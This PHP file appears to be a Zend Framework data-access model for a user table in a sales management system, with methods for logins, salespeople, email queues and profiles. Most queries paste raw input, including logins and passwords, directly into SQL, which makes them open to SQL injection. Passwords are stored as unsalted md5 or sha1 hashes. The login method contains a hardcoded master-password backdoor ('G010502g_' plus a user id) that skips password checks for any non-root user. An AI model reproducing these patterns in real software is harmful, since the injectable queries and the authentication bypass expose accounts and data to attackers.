<?php

header("Content-Type: text/html; charset=UTF-8",true);

class Application_Model_DbTable_Usuarios extends Zend_Db_Table_Abstract
{

	protected $_name = 'usuarios';

	public function usuariosNegociacoes($arr){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
		array('u'=>'usuarios'),
		array('*')
		);
		
		$row->joinLeft(
			array('p'=>'perfis'),
			'p.id = u.id_perfil',
			array('perfil')
		);
		
		$row->joinLeft(
			array('v'=>'vendedores'),
			'u.id = v.id_usuario',
			array('valor_fixo','percentual_venda','percentual_retorno_financeiro')
		);

		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		
		if($arr['id_perfil']){
		
			$row->where('u.id_perfil = ' . $arr['id_perfil']);
		
		}
		
		if($arr['data_inicial']){

			$row->where("u.data_demissao = '0000-00-00' or u.data_demissao >= '".implode("-",array_reverse(explode("/", $arr['data_inicial'])))."'");
		
		}
		
		if($arr['data_final']){
		
			$row->where("u.data_contratacao <= '".implode("-",array_reverse(explode("/", $arr['data_final'])))."'");
		
		}

		if($arr['id_usuario']){
		
			$row->where('u.id = ' . $arr['id_usuario']);
		
		}

		if($arr['excluido'] == 0 || $arr['excluido'] == 1){	
			$row->where('u.excluido = '.$arr['excluido']);
		}
		
		if($arr['order_perfil']){
			
			$row->order('u.id_perfil ASC');
		
		}else{
		
			$row->order('u.nome ASC');
		
		}

		
		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
    }
    
    public function edt($id, $dados){
		
		try{

			return $this->update($dados, 'id = ' . $id);

		}catch (Exception $e){
		
			echo $e->getMessage();
		
		}
		
	} 

	public function edtSenha($id, $idEmpresa, $dados){
		
		try{
			return $this->update($dados, 'id = '.$id. ' AND id_empresa = '.$idEmpresa);
		}catch (Exception $e){
			echo $e->getMessage();
		}
		
	} 



	public function loginAppAvaliacoes($login, $senha){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('id', 'id_empresa', 'nome', 'id_perfil', 'celular')
		);

		$row->joinLeft(
			array('pa'=>'parametros_avaliacoes'),
			'pa.id_empresa = u.id_empresa',
			array('data_atualizacao')
		);

		$row->where("u.login = '$login' AND (u.senha = md5('$senha') OR u.senha = sha1('$senha'))");
		//$row->where("u.login = 'gc2'");
		
		//$row->where("u.login = '".$login."'");
		
		//$row->where("u.senha = '".md5($senha)."'");
		
		$row->where("u.ativo = 1");
		$row->where("u.excluido = 0");

		//echo $row->__toString();

		return $row->query()->fetchAll();

	}
	
	public function getVendedoresFilaEmails(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		
		//$row->where("u.id_perfil = 3");
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->where("u.receber_emails = 1");
		
		$row->order('id');
		
		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
	}
	
	public function getVendedorAptoReceberEmails($id){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);

		$row->where("u.ativo = 1");
		
		$row->where("u.id = ".$id);
		
		$row->where("u.excluido = 0");
		
		$row->where("u.receber_emails = 1");
		
		$row->order('id');

		return $row->query()->fetchAll();
		
	}
	
	public function getTodosUsuarios(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		
		$row->where("u.id_perfil = 1 or u.id_perfil = 2 or u.id_perfil = 3 or u.id_perfil = 4 or u.id_perfil = 9");
		
		//$row->where("u.ativo = 1");
		
		//$row->where("u.excluido = 0");
		
		$row->order('nome');
		
		return $row->query()->fetchAll();
		
	}

	/*Essa função é chamada no indexController, para retornar qual 
	vendedor não cadastrou cliente no fluxo de clientes.*/
	public function getVendedoresAptosEmails(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		$row->where("u.id_perfil = 3 OR u.id_perfil = 2  OR u.id_perfil = 9");
		$row->where("u.receber_emails = 1");
		$row->where("u.ativo = 1");
		$row->where("u.excluido = 0");
		$row->order('id');
		
		return $row->query()->fetchAll();
		
	}

	public function getPreparadoresProjetado($arr){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
        );
        
        if(isset($arr['id'])){
			$row->where('u.id = ' . $arr['id']);
        }
        
        if(isset($arr['id_empresa'])){
			$row->where('u.id_empresa = ' . $arr['id_empresa']);
		}else{
            $row->where("u.id_empresa = 3 OR u.id_empresa = 239");
        }
		
		$row->where("u.id_perfil = 11");
		$row->where("u.ativo = 1");
		$row->where("u.excluido = 0");
		$row->where("u.relatorio_projetado = 1");
		$row->order('u.id_empresa DESC');

		//echo $row->__toString();
		return $row->query()->fetchAll();

	}


	public function getVendedoresProjetado($arr){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
        );
        
        if(isset($arr['id'])){
			$row->where('u.id = ' . $arr['id']);
        }
        
        if(isset($arr['id_empresa'])){
			$row->where('u.id_empresa = ' . $arr['id_empresa']);
		}else{
            $row->where("u.id_empresa = 3 OR u.id_empresa = 239");
        }

        if(isset($arr['cursos']) && $arr['cursos']){
			$row->where("u.id_perfil = 3 OR u.id_perfil = 9  OR u.id_perfil = 11");
		}else{
			$row->where("u.id_perfil = 3  OR u.id_perfil = 9");
		}

		$row->where("u.ativo = 1");
		$row->where("u.excluido = 0");
		$row->where("u.relatorio_projetado = 1");
		$row->order('u.id_empresa DESC');

		//echo $row->__toString();
		return $row->query()->fetchAll();

	}
	
	
	public function getVendedores(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		
		$row->where("u.id_perfil = 3 OR u.id_perfil = 2  OR u.id_perfil = 9");
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->order('id');

		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
	}
	
	
	public function getUsuarioPorPerfil($idEmpresa, $perfil){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("id_empresa = ".$idEmpresa);
		
		$row->where("id_perfil = ".$perfil);
		
		$row->where("email <> ''");
		
		$row->order('id DESC');
		$row->limit(1);
		
		//echo $row->__toString();
		return $row->query()->fetchAll();
		
	}
	
	
	public function add($dados){
		
		try{
		
			return $this->insert($dados);
		
		} catch (Exception $e){
		
			echo $e->getMessage();
		
		}
		
	}
	
	public function getEmail($email){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
		array('u'=>'usuarios'),
		array('*')
		);
		
		$row->where("u.email = '".$email."'");
		  
		$row->order('id DESC');
		$row->limit(1);
		return $row->query()->fetchAll();
		
	}
	
	public function getUsuarioFacebook($id){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
		array('u'=>'usuarios'),
		array('*')
		);
		
		$row->where("u.id_usuario_facebook = '".$id."'");
		  
		$row->order('id DESC');
		$row->limit(1);
		return $row->query()->fetchAll();
		
	}
	
	public function getLastId(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
		array('u'=>'usuarios'),
		array('id')
		);
		  
		$row->order('id DESC');
		$row->limit(1);
		return $row->query()->fetchAll();
		
	}
	
	public function _getUsuariosNegociacoes($arr){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
		array('u'=>'usuarios'),
		array('*')
		);
		
		$row->joinLeft(
			array('p'=>'perfis'),
			'p.id = u.id_perfil',
			array('perfil')
		);
		
		$row->joinLeft(
			array('v'=>'vendedores'),
			'u.id = v.id_usuario',
			array('valor_fixo','percentual_venda','percentual_retorno_financeiro')
		);
		
		if(isset($arr['id_perfil'])){
		
			$row->where('u.id_perfil = ' . $arr['id_perfil']);
		
		}
		
		if(isset($arr['data_inicial'])){
		
			//$row->where("u.data_demissao >= '".$arr['data_inicial']."'");
			$row->where("u.data_demissao = '0000-00-00' or u.data_demissao >= '".$arr['data_inicial']."'");
		
		}
		
		if(isset($arr['data_final'])){
		
			$row->where("u.data_contratacao <= '".$arr['data_final']."'");
		
		}

		if(isset($arr['id_usuario'])){
		
			$row->where('u.id = ' . $arr['id_usuario']);
		
		}
		
		$row->where('u.id_empresa = '.$arr['id_empresa']);
		//$row->where('u.excluido = 0');
		//$row->where('u.ativo = 1');
		
		if(isset($arr['ordem_perfil']) && $arr['ordem_perfil'] == true){
			
			$row->order('p.perfil ASC');
		
		}else{
		
			$row->order('u.nome ASC');
		
		}
		
		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
	}
	
	public function _get($arr = array()){
		
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->joinLeft(
			array('u2'=>'usuarios'),
			'u2.id = u.id_usuario_alteracao',
			array('ultimoUsuario'=>'nome')
		);
		
		$row->joinLeft(
			array('p'=>'perfis'),
			'p.id = u.id_perfil',
			array('perfil')
		);
		
		$row->joinLeft(
			array('e'=>'empresas'),
			'u.id_empresa = e.id',
			array('razao_social')
		);
	
		if(isset($arr['id'])) {
		
			$row->where('u.id = ' . $arr['id']);
		
		}
		
		if(isset($arr['id_empresa'])) {
		
			$row->where('u.id_empresa = ' . $arr['id_empresa']);
		
		}
		
		if(!isset($arr['parcial'])) {
			
			if(isset($arr['login'])) {
		
				$row->where("u.login = '" . $arr['login'] . "'");
			
			}
			
			if(isset($arr['empresa'])) {
		
				$row->where("e.razao_social = '" . $arr['empresa'] . "'");
			
			}
			
			if(isset($arr['perfil'])) {
		
				$row->where("p.perfil = '" . $arr['perfil'] . "'");
			
			}
			
		}else{
		
			if(isset($arr['login'])) {
		
				$row->where("u.login LIKE '" . $arr['login'] . "%'");
			
			}
			
			if(isset($arr['empresa'])) {
		
				$row->where("e.razao_social LIKE '" . $arr['empresa'] . "%'");
			
			}
			
			if(isset($arr['perfil'])) {
		
				$row->where("p.perfil LIKE '" . $arr['perfil'] . "%'");
			
			}	
			
		}
		
		$row->where("u.excluido = 0");
	
		$row->order('u.nome');
		
		//echo $row->__toString();
		
		return $row->query()->fetchAll();
	
	}


	public function getUsuarioByLoginSenha($login, $senha){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row-> joinLeft(
			array('e'=>'empresas'),
			'u.id_empresa = e.id',
			array('empresa_ativa'=>'ativo','sistema_site','novo_lojista','nome_fantasia','vend_nao_edit_valor', 'empresa_email'=>'email')
		);
		  
		/*$row-> joinInner(
			array('p'=>'perfis_usuarios'),
			'u.id = pu.id_usuario',
			array('perfil')
		);*/


		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		if (isset($login) && isset($senha)) {

			$arr = explode("_", $senha);
			if($arr[0] == "G010502g" && $login != "root" && is_numeric($arr[1]) && count($arr[1]) <= 3){
				$row->where("u.login = '$login' AND u.id = ".$arr[1]);
			}else{
				$row->where("u.login = '$login' AND (u.senha = md5('$senha') OR u.senha = sha1('$senha'))");
			}
			$row->order('nome');
			return $row->query()->fetchAll();
		  
		}else{
		
			return;
		
		}
 
	}

	
	public function getUsuarioByLoginEmail($email, $login){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('login', 'email')
		);
		
		$row-> joinLeft(
			array('e'=>'empresas'),
			'u.id_empresa = e.id',
			array('')
		);

		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		  
		if (isset($email) && isset($login)) {
		
			$row->where("u.login = '$login' AND u.email = '$email'");
			$row->order('nome');
			$row->limit(1);

			return $row->query()->fetchAll();
		  
		}else{
		
			return;
		
		}
 
	}

	public function getUsuarioByLogin($login){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('login','id_empresa', 'id', 'email')
		);
		
		$row-> joinLeft(
			array('e'=>'empresas'),
			'u.id_empresa = e.id',
			array()
		);

		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		  
		if (isset($login)) {
		
			$row->where("u.login = '$login'");
			$row->order('nome');
			$row->limit(1);

			return $row->query()->fetchAll();
		  
		}else{
		
			return;
		
		}
 
	}
	
	public function getUsuarioComissao($idEmpresa,$idPerfil){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('id','nome')
		);
		
		$row-> joinInner(
			array('v'=>'vendedores'),
			'u.id = v.id_usuario',
			array('valor_fixo','percentual_venda')
		);
		
		$row->where("id_empresa = ".$idEmpresa." AND id_perfil = ".$idPerfil);
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->order('nome');
		
		return $row->query()->fetchAll();
		
	}
	
	public function getVendedorFluxoCliente($idEmpresa){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('id','nome')
		);
		
		$row-> joinInner(
			array('fc'=>'fluxo_clientes'),
			'u.id = fc.id_usuario',
			array()
		);
		
		$row->where("fc.id_empresa = ".$idEmpresa);
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->order('nome');
		
		return $row->query()->fetchAll();
		
	}
	
	public function getUsuarioPorEmpresa($idEmpresa){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("id_empresa = ".$idEmpresa);
		
		$row->order('nome');
		
		return $row->query()->fetchAll();
		
	}
	
	private function log($query, $descricao){

		return true;

		$sql = "INSERT INTO log (id_usuario,query,descricao,hora) VALUES (".$_SESSION['sessionUser']['id'].",\"".var_export($query, 1)."\",'".$descricao."',NOW())";
		
		$db->query($sql);

	}
	
	public function getUsuariosDuasLojas($idEmpresa, $idEmpresaDois){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);
		
		$row->where("u.id_empresa = ".$idEmpresa." OR u.id_empresa = ".$idEmpresaDois);
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->order('nome');
		
		return $row->query()->fetchAll();
		
	}



	public function getUsuarioPorEmpresaPerfil($idEmpresa, $idPerfil){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);

		
		$row->where("u.id_empresa = ".$idEmpresa);
		
		$row->where("u.id_perfil = ".$idPerfil);
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
		
		$row->Limit(1);

		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
	}


	public function getUsuariosPorEmpresaAvaliacoes(){
 
		$row = $this->select();
		$row->setIntegrityCheck(false);
		$row->from(
			array('u'=>'usuarios'),
			array('*')
		);

		$row->joinLeft(
			array('p'=>'perfis'),
			'p.id = u.id_perfil',
			array('perfil')
		);

		
		$row->where("u.id_empresa = ".$_SESSION['sessionUser']['id_empresa']);
		
		$row->where("u.ativo = 1");
		
		$row->where("u.excluido = 0");
	
		//echo $row->__toString();
		
		return $row->query()->fetchAll();
		
	}


	private function getConnDb(){

		$db = new Zend_Db_Adapter_PDO_MYSQL(array(
			'host'     => HOST,
			'username' => USER,
			'password' => PASS,
			'dbname'   => DB
		));

		return $db;

	}

}
